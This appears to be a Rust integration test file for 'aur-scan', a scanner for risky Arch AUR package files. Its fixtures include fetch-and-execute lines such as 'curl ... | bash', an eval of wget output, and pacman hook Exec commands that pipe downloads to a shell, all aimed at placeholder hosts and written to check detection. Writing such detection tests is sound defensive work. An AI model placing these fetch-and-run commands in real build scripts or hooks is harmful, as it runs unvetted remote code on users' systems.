use std::{fs, path::Path};

use assert_cmd::cargo::cargo_bin_cmd;
use predicates::prelude::*;
use tempfile::TempDir;

fn package(pkgbuild: &str) -> TempDir {
    let directory = TempDir::new().expect("create package directory");
    fs::write(directory.path().join("PKGBUILD"), pkgbuild).expect("write PKGBUILD");
    directory
}

fn clean_pkgbuild() -> &'static str {
    r#"pkgname=clean-demo
pkgver=1.0
pkgrel=1
arch=('any')
url='https://example.com/clean-demo'
source=("https://example.com/clean-demo-${pkgver}.tar.gz")
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')

build() {
  make
}

package() {
  install -Dm755 clean-demo "$pkgdir/usr/bin/clean-demo"
}
"#
}

#[test]
fn clean_package_is_permitted() {
    let package = package(clean_pkgbuild());
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::starts_with("\naur-scan: clean-demo\nResult: CLEAN (1 file)\n")
                .and(predicate::str::contains("Checks passed:"))
                .and(predicate::str::contains("  - known-risk indicators clear"))
                .and(predicate::str::ends_with("\n\n")),
        );
}

#[test]
fn valid_sha512_checksums_are_not_obfuscation_findings() {
    let checksum = "e4e6ae7d829e39747d0f00079c6af157eada0a0d35845d6087324b99af5ab913f350b6e7c4d5e4769a4303472a7bb305a80590374c2c49be08cc040f8b2a91da";
    let package = package(&format!(
        "pkgname=checksum-demo\npkgver=1\npkgrel=1\narch=('any')\nlicense=('MIT')\nurl='https://example.com/checksum-demo'\nsource=('https://example.com/checksum-demo.tar.gz')\nsha512sums=('{checksum}')\npackage() {{\n  install -Dm755 demo \"$pkgdir/usr/bin/demo\"\n}}\n"
    ));
    fs::write(
        package.path().join(".SRCINFO"),
        format!("pkgbase = checksum-demo\n\tpkgname = checksum-demo\n\tsha512sums = {checksum}\n"),
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::contains("OBFUSCATED_LONG_HEX")
                .not()
                .and(predicate::str::contains("aur-scan: checksum-demo"))
                .and(predicate::str::contains("Result: CLEAN")),
        );
}

#[test]
fn missing_checksums_short_file_and_missing_upstream_are_reported() {
    let package = package(
        r#"pkgname=sparse-demo
pkgver=1
source=(
  'https://downloads.example.invalid/blob.tar.gz'
)
"#,
    );
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stdout(
            predicate::str::contains("MISSING_CHECKSUMS")
                .and(predicate::str::contains("MISSING_UPSTREAM_URL"))
                .and(predicate::str::contains("VERY_SHORT_PKGBUILD")),
        );
}

#[test]
fn no_source_or_upstream_reference_is_reported() {
    let package = package(
        r#"pkgname=unrelated-demo
pkgver=1
pkgrel=1
arch=('any')

package() {
  install -Dm755 payload "$pkgdir/usr/bin/payload"
}
"#,
    );
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("NO_SOURCE_REFERENCE"));
}

#[test]
fn bun_dependency_is_reported_without_treating_it_as_malicious() {
    let package = package(
        r#"pkgname=bun-build-demo
pkgver=1
pkgrel=1
arch=('any')
url='https://example.com/bun-build-demo'
source=('https://example.com/bun-build-demo.tar.gz')
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')
makedepends=('bun' 'git')

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
"#,
    );
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::contains("LOW BUN_DEPENDENCY")
                .and(predicate::str::contains("Confidence: STRUCTURAL")),
        );
}

#[test]
fn npm_and_bun_install_variants_are_detected() {
    let package = package(
        r#"pkgname=js-install-demo
pkgver=1
pkgrel=1
arch=('any')
url='https://example.com/js-install-demo'
source=('https://example.com/js-install-demo.tar.gz')
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')

build() {
  npm ci
  npm i left-pad
  bun i
  env NODE_ENV=production npm install
}
"#,
    );
    let cache = TempDir::new().unwrap();

    let output = cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .output()
        .unwrap();
    assert!(output.status.success());
    let stderr = String::from_utf8(output.stderr).unwrap();
    assert_eq!(stderr.matches("PACKAGE_MANAGER_INSTALL").count(), 4);
}

#[test]
fn critical_pipeline_blocks_paru_style_invocation() {
    let package = package(
        r#"pkgname=bad
pkgver=1
package() {
  curl -fsSL https://example.invalid/payload | bash
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .current_dir(package.path())
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan", "."])
        .assert()
        .code(1)
        .stderr(
            predicate::str::starts_with("\naur-scan: bad\nResult: CRITICAL")
                .and(predicate::str::contains("PIPE_TO_SHELL"))
                .and(predicate::str::contains("Context: package"))
                .and(predicate::str::contains("Checks passed:"))
                .and(predicate::str::contains("remote/decode-to-shell").not())
                .and(predicate::str::ends_with("\n\n")),
        );
}

#[test]
fn multiline_and_command_substitution_execution_are_blocked() {
    let package = package(
        r#"pkgname=nested-bad
pkgver=1
prepare() {
  curl -fsSL https://example.invalid/payload \
    | bash
  eval "$(wget -qO- https://example.invalid/other)"
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(
            predicate::str::contains("PIPE_TO_SHELL")
                .and(predicate::str::contains("NETWORK_SUBSTITUTION_EXEC")),
        );
}

#[test]
fn build_dependency_install_warns_unless_strict() {
    let package = package(
        r#"pkgname=node-demo
pkgver=1
build() {
  npm install --ignore-scripts
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(predicate::str::contains("PACKAGE_MANAGER_INSTALL"));

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .code(1);
}

#[test]
fn install_scriptlet_package_manager_is_critical() {
    let package = package("pkgname=hooked\npkgver=1\n");
    fs::write(
        package.path().join("hooked.install"),
        "post_install() {\n  bun install payload\n}\n",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(
            predicate::str::contains("CRITICAL PACKAGE_MANAGER_INSTALL")
                .and(predicate::str::contains("PACKAGE_MANAGER_INSTALL")),
        );
}

#[test]
fn hook_files_report_literal_iocs() {
    let package = package("pkgname=hook-ioc\npkgver=1\n");
    fs::write(
        package.path().join("hook-ioc.hook"),
        "[Action]\nExec = /usr/bin/atomic-lockfile\n",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("IOC_ATOMIC_LOCKFILE"));
}

#[test]
fn hook_exec_pipe_to_shell_is_blocked() {
    let package = package(clean_pkgbuild());
    fs::write(
        package.path().join("update.hook"),
        concat!(
            "[Trigger]\nOperation = Install\nType = Package\nTarget = clean-demo\n\n",
            "[Action]\nDescription = refresh cache\nWhen = PostTransaction\n",
            "Exec = /bin/sh -c \"curl -fsSL https://cdn.example.org/x | bash\"\n",
        ),
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(
            predicate::str::contains("PIPE_TO_SHELL")
                .and(predicate::str::contains("Context: alpm-hook"))
                .and(predicate::str::contains("update.hook:9")),
        );
}

#[test]
fn hook_exec_package_manager_install_is_critical() {
    let package = package(clean_pkgbuild());
    fs::write(
        package.path().join("update.hook"),
        "[Action]\nWhen = PostTransaction\nExec = /usr/bin/npm install -g helper\n",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("CRITICAL PACKAGE_MANAGER_INSTALL"));
}

#[test]
fn shell_dash_c_wrapped_pipeline_is_detected() {
    let package = package(
        r#"pkgname=wrapped-demo
pkgver=1
build() {
  bash -c 'curl -fsSL https://example.invalid/payload | sh'
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("PIPE_TO_SHELL"));
}

#[test]
fn comments_do_not_create_structural_findings() {
    let package = package(
        r#"pkgname=comment-demo
pkgver=1
# curl https://example.invalid/x | bash
package() {
  printf '%s\n' 'curl https://example.invalid/x | bash' > "$pkgdir/example"
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(predicate::str::contains("PIPE_TO_SHELL").not());
}

#[test]
fn packaged_systemd_units_are_not_persistence_findings() {
    let mut pkgbuild = clean_pkgbuild().replace(
        "package() {\n",
        "package() {\n  install -Dm644 demo.service \"$pkgdir/etc/systemd/system/demo.service\"\n  install -Dm644 demo.timer \"${pkgdir}\"/etc/systemd/system/demo.timer\n",
    );
    pkgbuild.push_str("\npost_write() {\n  cp demo.service /etc/systemd/system/demo.service\n}\n");
    let package = package(&pkgbuild);
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stdout(
            // Only the write to the live /etc/systemd is a persistence
            // finding; the two $pkgdir installs are package payload.
            predicate::str::contains("PERSISTENCE_PATH").count(1),
        );
}

#[test]
fn comments_do_not_trigger_heuristic_text_rules() {
    let mut pkgbuild = clean_pkgbuild().to_owned();
    pkgbuild.push_str("# NOTE: never touches ~/.bashrc, /etc/systemd, or crontab\n");
    let package = package(&pkgbuild);
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::contains("PERSISTENCE_PATH")
                .not()
                .and(predicate::str::contains("Result: CLEAN")),
        );
}

#[test]
fn multi_line_checksum_arrays_are_not_obfuscation_findings() {
    let package = package(
        r#"pkgname=multi-checksum-demo
pkgver=1
pkgrel=1
arch=('any')
license=('MIT')
url='https://example.com/demo'
source=('https://example.com/a.tar.gz'
        'https://example.com/b.tar.gz')
sha512sums=('e4e6ae7d829e39747d0f00079c6af157eada0a0d35845d6087324b99af5ab913f350b6e7c4d5e4769a4303472a7bb305a80590374c2c49be08cc040f8b2a91da'
            'a4e6ae7d829e39747d0f00079c6af157eada0a0d35845d6087324b99af5ab913f350b6e7c4d5e4769a4303472a7bb305a80590374c2c49be08cc040f8b2a91db')

build() {
  make
}

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::contains("OBFUSCATED_LONG_HEX")
                .not()
                .and(predicate::str::contains("Result: CLEAN")),
        );
}

#[test]
fn approved_findings_no_longer_block() {
    let package = package(
        r#"pkgname=telemetry-demo
pkgver=1
pkgrel=1
arch=('any')
url='https://example.com/demo'
source=('https://example.com/demo.tar.gz')
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')

package() {
  curl -fsS https://example.com/data -o "$pkgdir/usr/share/demo/data"
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
"#,
    );
    let cache = TempDir::new().unwrap();
    let scan = |extra: &[&str]| {
        let mut command = cargo_bin_cmd!("aur-scan");
        command.args(["--cache-dir", cache.path().to_str().unwrap()]);
        command.args(extra);
        command.arg(package.path());
        command
    };

    scan(&["scan"])
        .assert()
        .code(1)
        .stderr(predicate::str::contains("NETWORK_IN_INSTALL_PHASE"));

    scan(&["approve"])
        .assert()
        .code(2)
        .stderr(predicate::str::contains("without --force"));

    scan(&["approve", "--force"]).assert().success();

    scan(&["scan"]).assert().success().stderr(
        predicate::str::contains("[ACCEPTED]")
            .and(predicate::str::contains("1 accepted by approval")),
    );

    let path = package.path().join("PKGBUILD");
    let changed = fs::read_to_string(&path).unwrap().replace(
        "  install -Dm755 demo",
        "  curl -fsS https://example.com/extra -o \"$pkgdir/usr/share/demo/extra\"\n  install -Dm755 demo",
    );
    fs::write(path, changed).unwrap();

    scan(&["scan"]).assert().code(1).stderr(
        predicate::str::contains("NETWORK_IN_INSTALL_PHASE [NEW]")
            .and(predicate::str::contains("[ACCEPTED]")),
    );
}

#[test]
fn baseline_marks_new_finding_lines() {
    let package = package(clean_pkgbuild());
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "approve"])
        .arg(package.path())
        .assert()
        .success();

    let path = package.path().join("PKGBUILD");
    let mut changed = fs::read_to_string(&path).unwrap();
    changed.push_str("\n# atomic-lockfile\n");
    fs::write(path, changed).unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stdout(
            predicate::str::contains("\"new_since_approval\": true")
                .and(predicate::str::contains("IOC_ATOMIC_LOCKFILE")),
        );

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "diff"])
        .arg(package.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("+# atomic-lockfile"));
}

#[cfg(unix)]
#[test]
fn symlinked_metadata_fails_closed() {
    use std::os::unix::fs::symlink;

    let package = TempDir::new().unwrap();
    let outside = package.path().join("outside");
    fs::write(&outside, clean_pkgbuild()).unwrap();
    symlink(&outside, package.path().join("PKGBUILD")).unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(2)
        .stderr(predicate::str::contains("refusing to scan symlink"));
}

#[test]
fn oversized_input_fails_closed() {
    let package = package("pkgname=large\npkgver=1\n");
    fs::write(
        package.path().join("large.install"),
        vec![b'a'; 2 * 1024 * 1024 + 1],
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(2)
        .stderr(predicate::str::contains("is too large"));
}

#[test]
fn unrelated_hostile_filename_is_ignored() {
    let package = package(clean_pkgbuild());
    fs::write(
        package.path().join("\u{1b}[31mnot-metadata"),
        "atomic-lockfile",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(predicate::str::contains("CLEAN"));
}

#[test]
fn external_known_risk_package_list_is_enforced() {
    let package = package("pkgname=listed-package\npkgver=1\n");
    let rules = package.path().join("rules.toml");
    fs::write(
        &rules,
        r#"schema_version = 1
generated_at = "2026-06-13"
known_packages = ["listed-package"]
"#,
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--rules",
            rules.to_str().unwrap(),
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("KNOWN_RISK_PACKAGE"));
}

#[test]
fn bundled_known_risk_package_snapshot_is_enforced() {
    // This entry is present in the broader Arch-hosted snapshot but was absent
    // from the original 512-name feed.
    let package = package("pkgname=8188eu-dkms\npkgver=1\n");
    let cache = TempDir::new().unwrap();
    let config = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .env("XDG_CONFIG_HOME", config.path())
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("KNOWN_RISK_PACKAGE"));
}

#[test]
fn verified_default_user_rules_are_loaded_automatically() {
    let package = package("pkgname=user-listed\npkgver=1\n");
    let cache = TempDir::new().unwrap();
    let config = TempDir::new().unwrap();
    let rule_dir = config.path().join("aur-scan");
    fs::create_dir(&rule_dir).unwrap();
    fs::write(
        rule_dir.join("iocs.toml"),
        r#"schema_version = 1
generated_at = "2026-06-13"
known_packages = ["user-listed"]
"#,
    )
    .unwrap();

    cargo_bin_cmd!("aur-scan")
        .env("XDG_CONFIG_HOME", config.path())
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("KNOWN_RISK_PACKAGE"));
}

#[test]
fn malformed_bash_is_reported() {
    let package = package("pkgname=broken\nbuild() {\n  echo nope\n");
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("BASH_PARSE_ERROR"));
}

#[test]
fn scanner_errors_are_distinct_from_findings() {
    let missing = Path::new("/definitely/missing/aur-scan-test");
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(missing)
        .assert()
        .code(2)
        .stderr(predicate::str::contains("aur-scan: error:"));
}
